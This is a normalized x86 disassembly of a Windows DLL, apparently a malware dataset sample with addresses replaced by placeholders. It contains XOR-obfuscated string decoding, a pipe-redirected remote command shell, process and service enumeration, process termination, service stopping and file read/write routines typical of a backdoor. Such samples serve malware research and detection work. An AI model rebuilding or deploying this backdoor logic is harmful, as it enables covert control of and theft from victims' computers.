mov esi [ CloseHandle@IAT ]
push ecx
call esi
mov edx [ esp + 0x14 ]
push edx
call esi
pop esi
add esp 0x60
retn
sub_100022a0
sub esp 0x1c
push ebx
mov ebx [ esp + 0x24 ]
push ebp
mov ebp [ esp + 0x2c ]
push esi
xor esi esi
push edi
mov edi [ esp + 0x38 ]
mov [ esp + 0x18 ] esi
mov [ esp + 0x14 ] esi
mov [ esp + 0x10 ] esi
mov ecx [ rw-data ]
mov esi [ CloseHandle@IAT ]
push ecx
mov [ rw-data ] 0x0
call esi
mov edx [ rw-data ]
push edx
call esi
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax 0x10000
push 0x0
lea edx [ esp + 0x1c ]
push 0x0
sub eax esi
push edx
lea ecx [ esi + ebp ]
push eax
push ecx
push ebx
call [ PeekNamedPipe@IAT ]
mov eax [ esp + 0x18 ]
test edi edi
je r-xdata
mov cl [ eax + rw-data ]
xor cl 0x64
shr cl 0x1
mov [ esp + eax + 0x1c ] cl
inc eax
cmp eax 0xe
jl r-xdata
mov [ rw-data ] eax
lea edi [ esp + 0x1c ]
or ecx 0xffffffff
xor eax eax
mov [ esp + 0x2a ] 0x0
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi ebp
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov esi ecx
test eax eax
mov [ esp + 0x14 ] 0x0
je r-xdata
test eax eax
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
lea edx [ esp + 0x14 ]
push 0x0
push edx
push eax
lea eax [ esi + ebp ]
push eax
push ebx
call [ ReadFile@IAT ]
test eax eax
je r-xdata
cmp [ esp + 0x10 ] 0x28
jae r-xdata
mov eax [ esp + 0x14 ]
xor edi edi
add esi eax
test eax eax
je r-xdata
push 0x32
call [ Sleep@IAT ]
inc [ esp + 0x10 ]
jmp r-xdata
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ esp + 0x34 ]
push eax
push ecx
call [ GetExitCodeProcess@IAT ]
cmp [ esp + 0x34 ] 0x103
jne r-xdata
sub_100023f0
sub esp 0x168
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x180 ]
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x168
retn
mov eax [ rw-data ]
xor ebx ebx
cmp eax ebx
jne r-xdata
mov ebp [ esp + 0x17c ]
push ebp
call sub_100021d0
add esp 0x4
test eax eax
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
mov esi [ SetStdHandle@IAT ]
push edi
push 0xfffffff5
call esi
test eax eax
je r-xdata
xor eax eax
xor eax eax
push edi
push 0xfffffff4
call esi
xor eax eax
mov cl [ eax + rw-data ]
xor cl 0x3a
shr cl 0x1
mov [ esp + eax + 0x1c ] cl
inc eax
cmp eax 0x9
jl r-xdata
mov [ rw-data ] eax
mov [ esp + 0x25 ] bl
lea edi [ esp + 0x1c ]
mov cl [ eax + rw-data ]
xor cl 0x46
shr cl 0x1
mov [ esp + eax + 0x10 ] cl
inc eax
cmp eax 0x5
jl r-xdata
mov [ rw-data ] eax
mov [ esp + 0x15 ] bl
lea edi [ esp + 0x10 ]
jmp r-xdata
mov cl [ eax + rw-data ]
xor cl 0xed
shr cl 0x1
mov [ esp + eax + 0x1c ] cl
inc eax
cmp eax 0x9
jl r-xdata
mov [ rw-data ] eax
lea edx [ esp + 0x70 ]
push 0x104
lea eax [ esp + 0x20 ]
push edx
push eax
mov [ esp + 0x31 ] bl
call [ ExpandEnvironmentStringsA@IAT ]
test eax eax
jne r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea eax [ esp + 0x70 ]
push eax
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
je r-xdata
lea ecx [ esp + 0x70 ]
push 0x104
push ecx
call [ GetSystemDirectoryA@IAT ]
xor eax eax
xor eax eax
mov ecx 0x11
xor eax eax
lea edi [ esp + 0x2c ]
push rw-data
[ edi ]
lea ecx [ esp + 0x30 ]
mov esi 0x1
push ecx
push ebx
push ebx
push 0x200
push esi
push ebx
lea edx [ esp + 0x8c ]
push ebx
push edx
push ebx
mov [ esp + 0x54 ] 0x44
mov [ esp + 0x80 ] esi
mov [ esp + 0x84 ] bx
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
mov dl [ eax + rw-data ]
xor dl 0xf1
shr dl 0x1
mov [ esp + eax + 0x10 ] dl
inc eax
cmp eax 0x8
jl r-xdata
mov [ rw-data ] eax
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
xor eax eax
mov [ esp + 0x18 ] bl
lea edx [ esp + 0x70 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov cl [ eax + rw-data ]
xor cl 0x1c
shr cl 0x1
mov [ esp + eax + 0x1c ] cl
inc eax
cmp eax 0xe
jl r-xdata
mov [ rw-data ] eax
lea edi [ esp + 0x1c ]
or ecx 0xffffffff
xor eax eax
mov [ esp + 0x2a ] bl
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
push 0x1f4
call [ Sleep@IAT ]
jmp r-xdata
mov [ rw-data ] esi
sub_10002620
mov ecx [ rw-data ]
sub esp 0x2f0
test ecx ecx
push ebx
push ebp
push esi
push edi
jne r-xdata
xor eax eax
xor eax eax
mov dl [ eax + rw-data ]
xor dl 0x6
shr dl 0x1
mov [ esp + eax + 0x38 ] dl
inc eax
cmp eax 0x2
jl r-xdata
mov [ esp + 0x3a ] 0x0
xor eax eax
mov cl [ eax + rw-data ]
xor cl 0x2a
shr cl 0x1
mov [ esp + eax + 0x3c ] cl
inc eax
cmp eax 0x6
jl r-xdata
mov [ rw-data ] eax
mov [ esp + 0x42 ] 0x0
lea edi [ esp + 0x3c ]
jmp r-xdata
mov dl [ eax + rw-data ]
xor dl 0xe
shr dl 0x1
mov [ esp + eax + 0x30 ] dl
inc eax
cmp eax 0x2
jl r-xdata
mov [ esp + 0x32 ] 0x0
xor eax eax
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ esp + 0x304 ]
mov edx ecx
jmp r-xdata
mov dl [ eax + rw-data ]
xor dl 0x3c
shr dl 0x1
mov [ esp + eax + 0x34 ] dl
inc eax
cmp eax 0x2
jl r-xdata
mov [ rw-data ] eax
lea eax [ esp + 0x38 ]
push ecx
push eax
mov [ esp + 0x3e ] 0x0
call _strcmpi
add esp 0x8
test eax eax
jne r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ rw-data ]
lea edx [ esp + 0x30 ]
push ecx
push edx
call _strcmpi
add esp 0x8
test eax eax
jne r-xdata
mov ecx 0x4a
lea edi [ esp + 0x1d8 ]
push eax
push 0x2
[ edi ]
mov [ esp + 0x1e0 ] 0x128
call CreateToolhelp32Snapshot
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax [ rw-data ]
lea ecx [ esp + 0x34 ]
push eax
push ecx
call _strcmpi
add esp 0x8
test eax eax
jne r-xdata
push 0x4
push eax
push eax
call [ OpenSCManagerA@IAT ]
mov ebp eax
test ebp ebp
mov [ esp + 0x2c ] ebp
jne r-xdata
lea eax [ esp + 0x1d8 ]
push eax
push ebx
call Process32First
test eax eax
je r-xdata
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2f0
retn
mov [ esp + 0x1c ] eax
call [ GetLogicalDrives@IAT ]
mov ebx eax
mov [ esp + 0x13 ] 0x41
mov [ esp + 0x18 ] ebx
xor eax eax
push 0x0
lea eax [ esp + 0x18 ]
push 0x0
lea ecx [ esp + 0x24 ]
mov ebx [ EnumServicesStatusExA@IAT ]
push eax
push ecx
push 0x0
push 0x0
push 0x1
push 0x30
push 0x0
push ebp
call ebx
mov edx [ esp + 0x1c ]
lea esi [ edx + 0x1 ]
push esi
call ??2@YAPAXI@Z
mov edi eax
add esp 0x4
test edi edi
mov [ esp + 0x18 ] edi
jne r-xdata
mov cl [ eax + rw-data ]
xor cl 0xab
shr cl 0x1
mov [ esp + eax + 0x20 ] cl
inc eax
cmp eax 0x9
jl r-xdata
push ebx
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2f0
retn
mov ebp [ esp + 0x304 ]
mov cl [ eax + rw-data ]
xor cl 0xc1
shr cl 0x1
mov [ esp + eax + 0x20 ] cl
inc eax
cmp eax 0x9
jl r-xdata
mov [ rw-data ] eax
mov [ esp + 0x29 ] 0x0
lea edi [ esp + 0x20 ]
jmp r-xdata
mov dl [ eax + rw-data ]
xor dl 0x48
shr dl 0x1
mov [ esp + eax + 0xa4 ] dl
inc eax
cmp eax 0x32
jl r-xdata
mov [ rw-data ] eax
lea eax [ esp + 0xa4 ]
lea ecx [ esp + 0xd8 ]
push eax
push ecx
mov [ esp + 0xde ] 0x0
call sprintf
lea edi [ esp + 0xe0 ]
or ecx 0xffffffff
xor eax eax
add esp 0x8
[ edi ]
mov ebp [ esp + 0x304 ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
test ebx ebx
[ edi ] [ esi ]
je r-xdata
push 0x0
lea eax [ esp + 0x18 ]
push 0x0
lea ecx [ esp + 0x24 ]
push eax
push ecx
push esi
push edi
push 0x1
push 0x30
push 0x0
push ebp
call ebx
mov eax [ esp + 0x14 ]
xor ebx ebx
test eax eax
jbe r-xdata
push ebp
call [ CloseServiceHandle@IAT ]
xor eax eax
mov [ rw-data ] eax
mov [ esp + 0x29 ] 0x0
lea edi [ esp + 0x20 ]
jmp r-xdata
mov cl [ eax + rw-data ]
xor cl 0x46
shr cl 0x1
mov [ esp + eax + 0x4c ] cl
inc eax
cmp eax 0xb
jl r-xdata
mov edx [ esp + 0x1e0 ]
mov [ rw-data ] eax
lea eax [ esp + 0x1fc ]
push edx
lea ecx [ esp + 0x50 ]
push eax
lea edx [ esp + 0xe0 ]
push ecx
push edx
mov [ esp + 0x67 ] 0x0
call sprintf
lea edi [ esp + 0xe8 ]
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x1d8 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
push ebx
call Process32Next
test eax eax
jne r-xdata
xor eax eax
mov ebx 0x1
push edi
call ??3@YAXPAX@Z
add esp 0x4
push ebp
call [ CloseServiceHandle@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2f0
retn
mov ebp [ esp + 0x18 ]
mov cl [ eax + rw-data ]
xor cl 0x9b
shr cl 0x1
mov [ esp + eax + 0x20 ] cl
inc eax
cmp eax 0x9
jl r-xdata
mov [ rw-data ] eax
mov [ esp + 0x29 ] 0x0
lea edi [ esp + 0x20 ]
xor eax eax
mov cl [ eax + rw-data ]
xor cl 0x8b
shr cl 0x1
mov [ esp + eax + 0x94 ] cl
inc eax
cmp eax 0xc
jl r-xdata
mov edx [ esp + 0x1c ]
mov [ rw-data ] eax
lea eax [ esp + 0x94 ]
push edx
lea ecx [ esp + 0xdc ]
push eax
push ecx
mov [ esp + 0xac ] 0x0
call sprintf
lea edi [ esp + 0xe4 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
mov eax [ esp + 0x18 ]
mov dl [ esp + 0x13 ]
shr eax 0x1
inc dl
mov [ esp + 0x18 ] eax
test eax eax
mov [ esp + 0x13 ] dl
jne r-xdata
xor eax eax
mov dl [ eax + rw-data ]
xor dl 0x3c
shr dl 0x1
mov [ esp + eax + 0x20 ] dl
inc eax
cmp eax 0x9
jl r-xdata
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov ecx [ ebp ]
push eax
lea edx [ esp + 0x24 ]
push ecx
lea eax [ esp + 0xe0 ]
push edx
push eax
mov [ esp + 0x39 ] 0x0
call sprintf
lea edi [ esp + 0xe8 ]
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
sub edi ecx
add ebp 0x2c
mov esi edi
mov edi [ esp + 0x304 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ esp + 0x14 ]
mov ecx edx
and ecx 0x3
inc ebx
cmp ebx eax
[ edi ] [ esi ]
jb r-xdata
test [ esp + 0x18 ] 0x1
je r-xdata
mov cl [ eax + rw-data ]
xor cl 0x42
shr cl 0x1
mov [ esp + eax + 0x3c ] cl
inc eax
cmp eax 0x4
jl r-xdata
movsx edx [ esp + 0x13 ]
mov [ rw-data ] eax
lea eax [ esp + 0x3c ]
push edx
lea ecx [ esp + 0xdc ]
push eax
push ecx
mov [ esp + 0x4c ] 0x0
call sprintf
lea edi [ esp + 0xe4 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
mov [ esp + 0x45 ] 0x0
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov al [ esp + 0x13 ]
mov ecx edx
and ecx 0x3
mov [ esp + 0x44 ] al
[ edi ] [ esi ]
xor eax eax
xor eax eax
mov edi [ esp + 0x18 ]
mov ebp [ esp + 0x2c ]
mov cl [ eax + rw-data ]
xor cl 0xad
shr cl 0x1
mov [ esp + eax + 0x14 ] cl
inc eax
cmp eax 0x2
jl r-xdata
mov [ rw-data ] eax
lea edx [ esp + 0x14 ]
lea eax [ esp + 0x44 ]
push edx
push eax
mov [ esp + 0x1e ] 0x0
call [ lstrcatA@IAT ]
lea ecx [ esp + 0x44 ]
push ecx
call [ GetDriveTypeA@IAT ]
cmp eax 0x6
ja r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x1ec ]
push 0x105
lea ecx [ esp + 0x5c ]
push eax
push ecx
call [ GetVolumeInformationA@IAT ]
test eax eax
je r-xdata
jmp [ eax * 4 + jump_table_10002d70 ]
mov al [ rw-data ]
lea edi [ esp + 0x2c ]
xor al 0xe9
or ecx 0xffffffff
shr al 0x1
mov [ esp + 0x2c ] al
xor eax eax
mov [ esp + 0x2d ] 0x0
mov [ rw-data ] ebx
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ esp + 0x1c ]
mov ecx edx
and ecx 0x3
inc eax
[ edi ] [ esi ]
mov [ esp + 0x1c ] eax
lea edi [ esp + 0x1d8 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
xor eax eax
xor eax eax
xor eax eax
xor eax eax
xor eax eax
xor eax eax
xor eax eax
mov dl [ eax + rw-data ]
xor dl 0xcd
shr dl 0x1
mov [ esp + eax + 0x6c ] dl
inc eax
cmp eax 0x8
jl r-xdata
mov [ rw-data ] eax
mov [ esp + 0x74 ] 0x0
lea edi [ esp + 0x6c ]
jmp r-xdata
mov cl [ eax + rw-data ]
xor cl 0xb7
shr cl 0x1
mov [ esp + eax + 0x78 ] cl
inc eax
cmp eax 0x9
jl r-xdata
mov [ rw-data ] eax
mov [ esp + 0x81 ] 0x0
lea edi [ esp + 0x78 ]
jmp r-xdata
mov cl [ eax + rw-data ]
xor cl 0x6e
shr cl 0x1
mov [ esp + eax + 0x84 ] cl
inc eax
cmp eax 0xc
jl r-xdata
mov [ rw-data ] eax
mov [ esp + 0x90 ] 0x0
lea edi [ esp + 0x84 ]
jmp r-xdata
mov cl [ eax + rw-data ]
xor cl 0x70
shr cl 0x1
mov [ esp + eax + 0x58 ] cl
inc eax
cmp eax 0x7
jl r-xdata
mov [ rw-data ] eax
mov [ esp + 0x5f ] 0x0
lea edi [ esp + 0x58 ]
jmp r-xdata
mov cl [ eax + rw-data ]
xor cl 0xc9
shr cl 0x1
mov [ esp + eax + 0x60 ] cl
inc eax
cmp eax 0x8
jl r-xdata
mov [ rw-data ] eax
mov [ esp + 0x68 ] 0x0
lea edi [ esp + 0x60 ]
jmp r-xdata
mov cl [ eax + rw-data ]
xor cl 0x8f
shr cl 0x1
mov [ esp + eax + 0x20 ] cl
inc eax
cmp eax 0x8
jl r-xdata
mov [ rw-data ] eax
mov [ esp + 0x28 ] 0x0
lea edi [ esp + 0x20 ]
jmp r-xdata
mov cl [ eax + rw-data ]
xor cl 0x8d
shr cl 0x1
mov [ esp + eax + 0x4c ] cl
inc eax
cmp eax 0x9
jl r-xdata
mov [ rw-data ] eax
mov [ esp + 0x55 ] 0x0
lea edi [ esp + 0x4c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
sub_10002d90
mov eax [ rw-data ]
sub esp 0x48
test eax eax
push ebx
push ebp
push esi
push edi
jne r-xdata
xor eax eax
xor eax eax
mov cl [ eax + rw-data ]
xor cl 0x3e
shr cl 0x1
mov [ esp + eax + 0x10 ] cl
inc eax
cmp eax 0x2
jl r-xdata
mov [ esp + 0x12 ] 0x0
xor eax eax
mov cl [ eax + rw-data ]
xor cl 0xc7
shr cl 0x1
mov [ esp + eax + 0x14 ] cl
inc eax
cmp eax 0x6
jl r-xdata
mov [ rw-data ] eax
mov [ esp + 0x1a ] 0x0
lea edi [ esp + 0x14 ]
jmp r-xdata
mov dl [ eax + rw-data ]
xor dl 0x52
shr dl 0x1
mov [ esp + eax + 0x14 ] dl
inc eax
cmp eax 0x2
jl r-xdata
mov [ rw-data ] eax
mov eax [ rw-data ]
lea ecx [ esp + 0x10 ]
push eax
push ecx
mov [ esp + 0x1e ] 0x0
call _strcmpi
add esp 0x8
test eax eax
jne r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ esp + 0x5c ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x48
retn
mov eax [ rw-data ]
lea ecx [ esp + 0x14 ]
push eax
push ecx
call _strcmpi
add esp 0x8
test eax eax
jne r-xdata
mov edx [ rw-data ]
push edx
call atoi
add esp 0x4
push eax
push 0x0
push 0x1f0fff
call [ OpenProcess@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x48
retn
push 0x4
push eax
push eax
call [ OpenSCManagerA@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
mov edi [ esp + 0x5c ]
push 0x1
push esi
call [ TerminateProcess@IAT ]
push esi
mov edi eax
call [ CloseHandle@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push 0xf003f
push eax
push ebx
call [ OpenServiceA@IAT ]
mov ebp eax
test ebp ebp
jne r-xdata
mov dl [ eax + rw-data ]
xor dl 0x8d
shr dl 0x1
mov [ esp + eax + 0x20 ] dl
inc eax
cmp eax 0x17
jl r-xdata
xor eax eax
xor eax eax
test edi edi
je r-xdata
lea eax [ esp + 0x3c ]
push eax
push 0x1
push ebp
call [ ControlService@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x424
jne r-xdata
mov [ rw-data ] eax
mov [ esp + 0x37 ] 0x0
lea edi [ esp + 0x20 ]
jmp r-xdata
mov cl [ eax + rw-data ]
xor cl 0x62
shr cl 0x1
mov [ esp + eax + 0x14 ] cl
inc eax
cmp eax 0x9
jl r-xdata
mov [ rw-data ] eax
mov [ esp + 0x1d ] 0x0
lea edi [ esp + 0x14 ]
jmp r-xdata
mov cl [ eax + rw-data ]
xor cl 0x2c
shr cl 0x1
mov [ esp + eax + 0x14 ] cl
inc eax
cmp eax 0x5
jl r-xdata
mov [ rw-data ] eax
mov [ esp + 0x19 ] 0x0
lea edi [ esp + 0x14 ]
call [ GetLastError@IAT ]
cmp eax 0x426
jne r-xdata
mov eax [ esp + 0x40 ]
dec eax
je r-xdata
xor eax eax
xor eax eax
xor eax eax
xor eax eax
xor eax eax
sub eax 0x2
je r-xdata
mov cl [ eax + rw-data ]
xor cl 0x74
shr cl 0x1
mov [ esp + eax + 0x20 ] cl
inc eax
cmp eax 0x15
jl r-xdata
mov [ rw-data ] eax
mov [ esp + 0x35 ] 0x0
lea edi [ esp + 0x20 ]
mov cl [ eax + rw-data ]
xor cl 0x14
shr cl 0x1
mov [ esp + eax + 0x20 ] cl
inc eax
cmp eax 0x19
jl r-xdata
mov [ rw-data ] eax
mov [ esp + 0x39 ] 0x0
lea edi [ esp + 0x20 ]
jmp r-xdata
mov cl [ eax + rw-data ]
xor cl 0x70
shr cl 0x1
mov [ esp + eax + 0x20 ] cl
inc eax
cmp eax 0x18
jl r-xdata
mov [ rw-data ] eax
mov [ esp + 0x38 ] 0x0
lea edi [ esp + 0x20 ]
mov cl [ eax + rw-data ]
xor cl 0x32
shr cl 0x1
mov [ esp + eax + 0x20 ] cl
inc eax
cmp eax 0x12
jl r-xdata
mov [ rw-data ] eax
mov [ esp + 0x32 ] 0x0
lea edi [ esp + 0x20 ]
jmp r-xdata
mov cl [ eax + rw-data ]
xor cl 0xe5
shr cl 0x1
mov [ esp + eax + 0x20 ] cl
inc eax
cmp eax 0xa
jl r-xdata
mov [ rw-data ] eax
mov [ esp + 0x2a ] 0x0
lea edi [ esp + 0x20 ]
jmp r-xdata
xor eax eax
dec eax
jne r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
push ebx
mov esi edi
mov edi [ esp + 0x60 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call [ CloseServiceHandle@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x48
retn
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ esp + 0x5c ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov cl [ eax + rw-data ]
xor cl 0x26
shr cl 0x1
mov [ esp + eax + 0x20 ] cl
inc eax
cmp eax 0xf
jl r-xdata
mov [ rw-data ] eax
mov [ esp + 0x2f ] 0x0
lea edi [ esp + 0x20 ]
jmp r-xdata
mov esi [ CloseServiceHandle@IAT ]
push ebp
call esi
push ebx
call esi
xor eax eax
mov cl [ eax + rw-data ]
xor cl 0xcd
shr cl 0x1
mov [ esp + eax + 0x20 ] cl
inc eax
cmp eax 0x10
jl r-xdata
mov [ rw-data ] eax
mov [ esp + 0x30 ] 0x0
lea edi [ esp + 0x20 ]
jmp r-xdata
sub_10003120
push 0xffffffff
push sub_100045fb
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2e4
push ebp
xor ebp ebp
push esi
push edi
mov [ esp + 0x14 ] ebp
xor eax eax
mov cl [ eax + rw-data ]
xor cl 0xad
shr cl 0x1
mov [ esp + eax + 0x74 ] cl
inc eax
cmp eax 0x37
jl r-xdata
push 0xea60
push 0x1
push rw-data
lea edx [ esp + 0x80 ]
push rw-data
push edx
push rw-data
lea ecx [ esp + 0x50 ]
mov [ rw-data ] eax
mov [ esp + 0xc3 ] 0x0
call sub_10001020
mov eax [ rw-data ]
mov [ esp + 0x2f8 ] ebp
cmp eax ebp
jne r-xdata
push ebx
push 0x20000
call ??2@YAPAXI@Z
mov ebx eax
add esp 0x4
cmp ebx ebp
je r-xdata
xor eax eax
mov esi [ esp + 0x10 ]
xor eax eax
mov cl [ eax + rw-data ]
xor cl 0xe9
shr cl 0x1
mov [ esp + eax + 0x14 ] cl
inc eax
cmp eax 0x6
jl r-xdata
mov [ rw-data ] eax
lea edi [ esp + 0x14 ]
or ecx 0xffffffff
xor eax eax
mov [ esp + 0x1a ] 0x0
mov [ esp + 0x2f8 ] 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ esp + 0x300 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x38 ]
call sub_10001090
xor eax eax
jmp r-xdata
lea ecx [ esp + 0x38 ]
mov [ esp + 0x2f8 ] 0xffffffff
call sub_10001090
mov eax 0x1
push esi
call [ CloseHandle@IAT ]
mov cl [ eax + rw-data ]
xor cl 0x58
shr cl 0x1
mov [ esp + eax + 0x20 ] cl
inc eax
cmp eax 0x4
jl r-xdata
mov [ rw-data ] eax
mov eax [ rw-data ]
lea edx [ esp + 0x20 ]
mov [ esp + 0x24 ] 0x0
push edx
push eax
call _strcmpi
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ esp + 0x2f0 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x2f0
retn 0x4
mov edx [ rw-data ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
lea esi [ esp + 0xf0 ]
sub edi ecx
mov eax ecx
mov [ esp + 0x10 ] esi
mov esi edi
mov edi [ esp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
test ebp ebp
[ edi ] [ esi ]
je r-xdata
mov [ esp + 0x18 ] 0x1
mov ebp [ esp + 0x18 ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
lea edx [ esp + 0x104 ]
push 0x80000000
push edx
call [ CreateFileA@IAT ]
mov esi eax
mov [ esp + 0x10 ] eax
push 0x5c
push edx
call strrchr
add esp 0x8
test eax eax
je r-xdata
push ebx
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
test ebp ebp
je r-xdata
push 0x0
push 0x80
push 0x2
push 0x0
push 0x1
lea ecx [ esp + 0x104 ]
push 0x40000000
push ecx
call [ CreateFileA@IAT ]
mov esi eax
mov [ esp + 0x10 ] esi
jmp r-xdata
lea edi [ eax + 0x1 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xf0 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
cmp esi 0xffffffff
pop ebx
je r-xdata
lea ecx [ esp + 0x28 ]
push ecx
push esi
call [ GetFileSize@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov eax [ rw-data ]
push eax
call atoi
add esp 0x4
mov edi eax
jmp r-xdata
cmp esi 0xffffffff
je r-xdata
mov eax [ esp + 0x28 ]
test eax eax
jne r-xdata
xor eax eax
xor eax eax
mov dl [ eax + rw-data ]
xor dl 0x62
shr dl 0x1
mov [ esp + eax + 0x64 ] dl
inc eax
cmp eax 0x13
jl r-xdata
mov edx [ rw-data ]
mov [ rw-data ] eax
lea eax [ esp + 0x1f4 ]
lea ecx [ esp + 0x64 ]
push eax
push ecx
push edx
mov [ esp + 0x83 ] 0x0
call sscanf
mov eax [ rw-data ]
add esp 0xc
lea ecx [ esp + 0x3c ]
push eax
call sub_10001200
lea ecx [ esp + 0x1f4 ]
push ecx
lea ecx [ esp + 0x40 ]
call sub_10001270
test ebp ebp
jne r-xdata
mov dl [ eax + rw-data ]
xor dl 0x40
shr dl 0x1
mov [ esp + eax + 0x2c ] dl
inc eax
cmp eax 0xc
jl r-xdata
mov [ rw-data ] eax
lea eax [ esp + 0x2c ]
push edi
lea ecx [ esp + 0xb4 ]
push eax
push ecx
mov [ esp + 0x44 ] 0x0
call sprintf
add esp 0xc
lea ecx [ esp + 0x3c ]
call sub_100010e0
test eax eax
je r-xdata
lea edx [ esp + 0xb0 ]
lea ecx [ esp + 0x3c ]
push edx
call sub_10001370
mov ebp edi
mov edx [ esp + 0x14 ]
lea ecx [ esp + 0x3c ]
push edx
push ebx
call sub_100013e0
mov edi eax
